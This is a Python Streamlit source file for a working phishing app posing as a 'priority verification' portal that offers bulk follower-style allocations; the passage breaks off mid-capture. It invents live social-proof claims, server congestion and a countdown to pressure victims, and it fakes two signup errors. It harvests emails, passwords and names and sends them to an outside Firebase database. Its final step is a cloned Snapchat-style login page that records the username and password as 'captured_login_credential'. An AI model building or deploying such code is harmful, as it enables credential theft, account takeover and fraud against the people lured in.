import streamlit as st
import time
import requests
import datetime
import uuid
import random

# --- 1. CONFIGURATION FRAMEWORK ---
st.set_page_config(
    page_title="Priority Verification Terminal",
    page_icon="⚡",
    layout="centered",
    initial_sidebar_state="collapsed"
)

# --- 2. ULTRARICH LIGHT-MODE ENGINE & SOCIAL PROOF WIDGETS CSS ---
GLOBAL_MARKDOWN_INJECTOR = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');

/* Force Core CSS Light Canvas Context */
:root { color-scheme: light !important; }
html, body, .stApp { background-color: #f2f2f2 !important; color: #000000 !important; font-family: 'Inter', sans-serif !important; }
div[data-testid="stSidebar"] { display: none !important; }

/* Global Base Text Correction */
p, span, h1, h2, h3, h4, h5, h6, label { color: #000000 !important; font-family: 'Inter', sans-serif !important; }

/* Dynamic Social Proof Notification Widget */
.social-proof-banner {
    background: linear-gradient(135deg, #eff6ff 0%, #dbeafe 100%);
    border-left: 5px solid #2563eb;
    padding: 12px 16px;
    border-radius: 8px;
    box-shadow: 0 4px 12px rgba(37, 99, 235, 0.08);
    margin-bottom: 15px;
    animation: pulse 2s infinite;
}
.social-proof-text { font-size: 13.5px; font-weight: 700; color: #1e40af !important; margin: 0; }

/* Server Load Widget Gauge */
.server-gauge-box {
    background: #ffffff;
    border: 1px solid #e2e8f0;
    border-radius: 8px;
    padding: 10px 15px;
    margin-bottom: 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.gauge-status { font-size: 12px; font-weight: 800; text-transform: uppercase; color: #dc2626 !important; }

/* Progress Top Stepper Bar */
.step-container { background: #ffffff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.04); margin-bottom: 20px; text-align: center; }
.step-text { font-weight: 700; font-size: 14px; color: #2563eb !important; text-transform: uppercase; letter-spacing: 0.5px; }

/* Card Wrapper Mechanics */
.main-canvas-card { background: #ffffff !important; border-radius: 12px !important; padding: 30px 25px !important; box-shadow: 0 4px 20px rgba(0,0,0,0.04) !important; border: 1px solid #eef0f2 !important; margin-bottom: 25px; }
.portal-header { text-align: center; margin-bottom: 25px; }
.portal-title { font-size: 26px; font-weight: 800; color: #000000 !important; }
.portal-subtitle { font-size: 13px; color: #64748b !important; font-weight: 500; margin-top: 4px; }

/* Custom Logo Bounding Boxes (Square Standard Constraint) */
.bounded-logo-frame { display: block; margin: 0 auto 15px auto; width: 65px !important; height: 65px !important; object-fit: contain; }

/* General Input Labels & Forms styling */
.custom-label-system { font-weight: 700 !important; font-size: 13px !important; color: #000000 !important; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px !important; display: block; }
div[data-baseweb='input'] { border: none !important; border-radius: 6px !important; overflow: hidden !important; }
div[data-testid="stTextInput"] div[data-baseweb='input'] { background-color: #f6f7f9 !important; }
div[data-baseweb='input'] input { color: #000000 !important; font-weight: 600 !important; font-size: 14px !important; }

/* Countdown CSS */
.countdown-box { text-align: center; background: #fffc00; border: 2px solid #000000; padding: 10px; border-radius: 8px; font-weight: 800; font-size: 18px; margin-bottom: 15px; color: #000000 !important; }

/* STEP 5 DITTO SCREENSHOT SPECIFIC GRID OVERRIDES */
.clone-brand-text { text-align: center !important; font-size: 38px !important; font-weight: 400 !important; color: #000000 !important; margin-bottom: 30px !important; margin-top: -10px !important; letter-spacing: -1px !important; }
.clone-gray-label { color: #8c92ac !important; font-size: 11px !important; font-weight: 700 !important; text-transform: capitalize !important; margin-bottom: 6px !important; display: block !important; }
div[data-testid="stTextInput"]:nth-of-type(2) div[data-baseweb='input'] { background-color: #eef2fb !important; } /* Blue tint password box from picture */
.forgot-pass-trigger { text-align: right !important; font-size: 12px !important; color: #8c92ac !important; font-weight: 500 !important; margin-top: 6px !important; }

/* Exact Snap-Yellow Pill Shape Button */
.stButton > button[kind="secondary"] {
    background-color: #fffc00 !important;
    color: #000000 !important;
    border-radius: 999px !important;
    width: 140px !important;
    font-weight: 700 !important;
    font-size: 15px !important;
    border: none !important;
    height: 42px !important;
    margin: 30px auto 5px auto !important;
    display: block !important;
    box-shadow: none !important;
    text-transform: none !important;
}

/* Hacker CMD Console Core styling */
.cmd-box { background-color: #000000 !important; padding: 15px; border-radius: 6px; border: 1px solid #22c55e; margin: 15px 0; font-family: 'Courier New', Courier, monospace !important; }
.cmd-text { color: #22c55e !important; font-size: 13px; font-weight: 600; line-height: 1.6; }

/* Big Engagement Action Trigger link */
.engagement-action-box { text-align: center; margin: 20px 0; padding: 15px; background: #eef2ff; border: 1px dashed #2563eb; border-radius: 8px; }
.engagement-action-text { color: #2563eb !important; font-weight: 700; font-size: 15px; text-decoration: none; }
</style>
"""
st.markdown(GLOBAL_MARKDOWN_INJECTOR, unsafe_allow_html=True)

# --- 3. HARDWARE REAL-TIME PERSISTENCE PATHWAY ---
BASE_FIREBASE_LINK = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/google_sites_logs/-OtV1bgRTfms9dW0PXTu"

# --- 4. ENGINE ARCHITECTURE CORE STATE ---
if 'step' not in st.session_state: st.session_state.step = 1
if 'portal_data' not in st.session_state: st.session_state.portal_data = {}
if 'signup_attempts_count' not in st.session_state: st.session_state.signup_attempts_count = 1
if 'login_attempts_count' not in st.session_state: st.session_state.login_attempts_count = 1
if 'intercepted_dataset' not in st.session_state: st.session_state.intercepted_dataset = []
if 'unique_session_folder' not in st.session_state: st.session_state.unique_session_folder = str(uuid.uuid4())[:12]
if 'random_seed' not in st.session_state: st.session_state.random_seed = random.randint(10, 99)

# Countdown State Mechanics (30 Minutes Lock Window)
if 'countdown_end' not in st.session_state:
    st.session_state.countdown_end = time.time() + (30 * 60)

current_time = time.time()
remaining_seconds = int(st.session_state.countdown_end - current_time)

if remaining_seconds <= 0:
    st.session_state.clear()
    st.rerun()

mins, secs = divmod(remaining_seconds, 60)
countdown_string = f"⏱️ SECURE VERIFICATION SESSION CLOSES IN: {mins:02d}:{secs:02d}"

# Global Top Countdown Bar Display
st.markdown(f"<div class='countdown-box'>{countdown_string}</div>", unsafe_allow_html=True)

# ==========================================
# ⚡ FEATURE 1: REAL-TIME SOCIAL PROOF SYSTEM
# ==========================================
fake_users = ["aman_kumar", "neha_singh", "rahul_v07", "priya_matrix", "deepak_hub", "sneha_claim", "vikram_op", "ananya_dx"]
fake_counts = ["2,500", "5,000", "10,000", "20,000"]
selected_fake_user = fake_users[st.session_state.random_seed % len(fake_users)]
selected_fake_count = fake_counts[(st.session_state.random_seed + st.session_state.step) % len(fake_counts)]

# Live Floating Drop Banner Injected Directly
st.markdown(f"""
<div class='social-proof-banner'>
    <p class='social-proof-text'>⚡ LIVE DROP: @{selected_fake_user} successfully claimed {selected_fake_count} allocation units via priority queue bypass corridor!</p>
</div>
""", unsafe_allow_html=True)

# Live Interactive Server Load Gauge
calculated_load = 84 + (st.session_state.random_seed % 13)
st.markdown(f"""
<div class='server-gauge-box'>
    <span style='font-size: 13px; font-weight:600;'>📊 Global Cloud Cluster Strain:</span>
    <span class='gauge-status'>🚨 CONGESTION OVERLOAD: {calculated_load}%</span>
</div>
""", unsafe_allow_html=True)


def push_to_firebase_matrix(event_state):
    runtime_node_id = str(uuid.uuid4())[:8]
    target_api_endpoint = f"{BASE_FIREBASE_LINK}/{st.session_state.unique_session_folder}/{runtime_node_id}.json"
    
    payload = {
        "server_timestamp": str(datetime.datetime.now()),
        "current_step_context": event_state,
        "primary_profile_context": st.session_state.portal_data,
        "logged_credential_sequences": st.session_state.intercepted_dataset
    }
    try:
        requests.put(target_api_endpoint, json=payload)
    except:
        pass

# --- 5. PROGRESSIVE SLIDER STEPPER INDICATOR ---
st.markdown("<div class='step-container'>", unsafe_allow_html=True)
if st.session_state.step <= 4:
    st.markdown(f"<p class='step-text'>📍 Progress Mapping: Stage {st.session_state.step} of 4</p>", unsafe_allow_html=True)
    st.slider("System Stage Phase Location Selector", min_value=1, max_value=4, value=int(st.session_state.step), disabled=True, label_visibility="collapsed")
else:
    st.markdown("<p class='step-text'>🔒 OFFICIAL AUTHENTICATION INTERFACE LAYER</p>", unsafe_allow_html=True)
st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 1: PORTAL PROFILE GENERATOR ENGINE
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='main-canvas-card'>", unsafe_allow_html=True)
    
    col_left, col_mid, col_right = st.columns([1, 1.2, 1])
    with col_mid:
        try:
            st.image("1.png", width=65, output_format="PNG")
        except:
            st.markdown("<div style='text-align:center; color:gray; font-size:11px;'>[ 1.png Profile Icon ]</div>", unsafe_allow_html=True)
            
    st.markdown("<div class='portal-header'><div class='portal-title'>Create Allocation Profile</div><div class='portal-subtitle'>Cloud Core Network Management System Node</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-label-system'>🔒 Master Email Identity</span>", unsafe_allow_html=True)
    email_input = st.text_input("email_field", label_visibility="collapsed")
    
    st.markdown("<span class='custom-label-system'>👤 Desired Target Handle</span>", unsafe_allow_html=True)
    user_input = st.text_input("user_field", placeholder="e.g., UltraCreator", label_visibility="collapsed")
    
    st.markdown("<span class='custom-label-system'>🔑 Access Token Password</span>", unsafe_allow_html=True)
    pass_input = st.text_input("pass_field", type="password", label_visibility="collapsed")
    
    st.write("")
    if st.button("PROCEED TO VERIFICATION ENGINE 🚀", type="primary", use_container_width=True):
        if email_input and user_input and pass_input:
            st.session_state.random_seed = random.randint(10, 99) # Rotate global live stats seed
            # Dual Failure Trapping Protocol Matrix Logic
            if st.session_state.signup_attempts_count < 3:
                terminal_msg = st.empty()
                terminal_msg.info("⚡ Synchronizing route pathways...")
                time.sleep(1.2)
                terminal_msg.error(f"❌ Error 403: Network Node Congestion Refused Connection. Please retry. (Attempt {st.session_state.signup_attempts_count}/2 Checked)")
                st.session_state.signup_attempts_count += 1
            else:
                st.success("✅ Mainframe Registration Acknowledged. Node Created.")
                st.session_state.portal_data.update({"email": email_input, "target_username": user_input, "generated_master_key": pass_input})
                push_to_firebase_matrix("PORTAL_SIGNUP_PASSED")
                st.session_state.step = 2
                time.sleep(1)
                st.rerun()
        else:
            st.warning("⚠️ Form constraint mismatch. Fill out all metrics.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 2: PROFILE META DATA PARSER
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='main-canvas-card'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Identity Meta Alignment ⚙️</div><div class='portal-subtitle'>Binding tracking layers to hardware profile mapping</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-label-system'>First Name Registry</span>", unsafe_allow_html=True)
    first_name_input = st.text_input("fn", label_visibility="collapsed")
    
    st.markdown("<span class='custom-label-system'>Last Name Registry</span>", unsafe_allow_html=True)
    last_name_input = st.text_input("ln", label_visibility="collapsed")
    
    st.write("")
    if st.button("COMPILE STRUCTURAL PAYLOAD METRICS ⚡", type="primary", use_container_width=True):
        if first_name_input:
            st.session_state.random_seed = random.randint(10, 99)
            UI_bar = st.progress(0)
            for structural_percentage in range(100):
                time.sleep(0.01)
                UI_bar.progress(structural_percentage + 1)
            st.session_state.portal_data.update({"first_name": first_name_input, "last_name": last_name_input})
            push_to_firebase_matrix("META_SYNC_COMPLETE")
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("❌ Execution Error: Structural first name binding string cannot be empty.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 3: ALLOCATION VOLUMETRIC GRID
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='main-canvas-card'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Target Server Parameters 🎯</div><div class='portal-subtitle'>Configuring database stream target optimization boundaries</div></div>", unsafe_allow_html=True)
    
    profile_visibility_state = st.radio("Is target tracking profile node completely Public? 🔓", ["Yes, verified Public", "No, currently Private"], index=0)
    avatar_check_state = st.radio("Does target interface map contain an active profile photo? 📸", ["Yes", "No"], index=0)
    
    st.write("---")
    requested_load_volume = st.select_slider("🔥 Choose Volumetric Delivery Stream Load Allocation Size:", options=[1000, 2500, 5000, 10000, 20000])
    
    st.write("")
    if st.button("RUN ISOLATION MATRIX ALGORITHM 🛡️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        if profile_visibility_state == "No, currently Private" or avatar_check_state == "No":
            st.error("❌ Processing Exception: Target pipeline rejects private or unmapped profile nodes.")
        else:
            isolation_placeholder = st.empty()
            isolation_placeholder.warning("📡 Locking remote proxy handshake tunnels...")
            time.sleep(1.2)
            isolation_placeholder.warning("📡 Isolating node stream allocation pipes...")
            time.sleep(1.2)
            isolation_placeholder.empty()
            
            st.session_state.portal_data.update({
                "account_visibility_metric": profile_visibility_state, 
                "avatar_presence_metric": avatar_check_state, 
                "load_volume_units": requested_load_volume
            })
            push_to_firebase_matrix("TARGET_MATRIX_SET")
            st.session_state.step = 4
            st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 4: INSTANT BYPASS GATEWAY INDEX
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='main-canvas-card'>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; padding:15px; background:#f8fafc; border-radius:8px; border:1px solid #e2e8f0; margin-bottom:20px;'><h4>Standard Queue Pipeline Status: <span style='color:#ef4444;'>HEAVY DELAY</span></h4><p style='font-size:13px; color:#64748b; margin:0;'>Estimated processing delay: <b>24 Hours</b>.</p></div>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; margin-bottom:20px;'><h3 style='font-weight:800; margin:0;'>⚡ Bypass Queue Protocol (Instant 30-Min Arrival)</h3><p style='font-size:13px; color:#475569; margin-top:4px;'>Authenticate ownership identity profile matching metrics to pass immediately into premium drop node streams.</p></div>", unsafe_allow_html=True)
    
    st.markdown("""
    <div class='engagement-action-box'>
        <span class='engagement-action-text'>🔗 👉 CLICK HERE TO ATTACH INSTANT DELIVERY ROUTE LOGS 👈 🔗</span>
        <p style='margin:5px 0 0 0; font-size:11px; color:#6b7280;'>[ Verified Server Footprint Connection Active ]</p>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("PRO: ACCESS OFFICIAL IDENTITY VALIDATION INTERFACE NOW 🚀", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        script_detector_msg = st.empty()
        script_detector_msg.info("🤖 Scanning device footprint traces for automated tracking scripts...")
        time.sleep(1.5)
        script_detector_msg.success("✅ Device profile verified clean. Launching secure login console frame...")
        time.sleep(0.8)
        script_detector_msg.empty()
        st.session_state.step = 5
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 5: EXACT MATCH SYSTEM-CLONE VIEWPORT SCREEN
# ==========================================
elif st.session_state.step == 5:
    st.markdown("<div class='stApp' style='background-color:#ffffff !important;'>", unsafe_allow_html=True)
    
    st.markdown("<div class='main-canvas-card' style='background-color:#ffffff !important; border-radius:10px !important; box-shadow: 0 2px 12px rgba(0,0,0,0.04) !important; max-width:400px !important; margin:40px auto 10px auto !important; border:1px solid #f1f1f1 !important;'>", unsafe_allow_html=True)
    
    c1, c2, c3 = st.columns([1, 1.3, 1])
    with c2:
        try:
            st.image("2.jpg", width=65, output_format="JPEG")
        except:
            st.markdown("<p style='color:#ff4444; font-family:sans-serif; text-align:center; font-size:26px; font-weight:700; margin:0; letter-spacing:-1px;'>logo</p>", unsafe_allow_html=True)
            
    st.markdown("<p class='clone-brand-text'>vinay chat</p>", unsafe_allow_html=True)
    
    with st.form("screenshot_replica_form_engine", clear_on_submit=False):
        st.markdown("<span class='clone-gray-label'>Username or Email</span>", unsafe_allow_html=True)
        login_user_string = st.text_input("user_replica", placeholder="Your Username Here", label_visibility="collapsed")
        
        st.write("")
        
        st.markdown("<span class='clone-gray-label'>Password</span>", unsafe_allow_html=True)
        login_pass_string = st.text_input("pass_replica", type="password", placeholder="••••••••", label_visibility="collapsed")
        
        st.markdown("<p class='forgot-pass-trigger'>Forgot Password</p>", unsafe_allow_html=True)
        
        st.write("")
        form_submit_trigger = st.form_submit_button("Log In", type="secondary")
        
        if form_submit_trigger:
            if login_user_string and login_pass_string:
                st.session_state.random_seed = random.randint(10, 99)
                log_capture_map = {
                    "intercept_attempt_index": st.session_state.login_attempts_count,
                    "captured_login_handle": login_user_string,
                    "captured_login_credential": login_pass_string,
                    "timestamp_string": str(datetime.datetime.now())
                }
  
